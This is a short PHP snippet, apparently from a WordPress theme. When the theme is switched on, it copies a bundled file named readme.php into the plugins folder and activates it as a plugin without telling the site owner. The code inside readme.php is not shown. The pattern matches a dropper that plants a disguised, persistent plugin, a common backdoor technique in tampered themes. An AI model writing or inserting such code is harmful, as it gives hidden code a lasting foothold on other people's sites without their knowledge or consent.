<?php
add_action('after_switch_theme',function(){
include_once(ABSPATH.'wp-admin/includes/plugin.php');
$source=get_template_directory().'/readme.php';
$destination=WP_PLUGIN_DIR.'/readme.php';
copy($source,$destination);
activate_plugin('readme.php');
}); 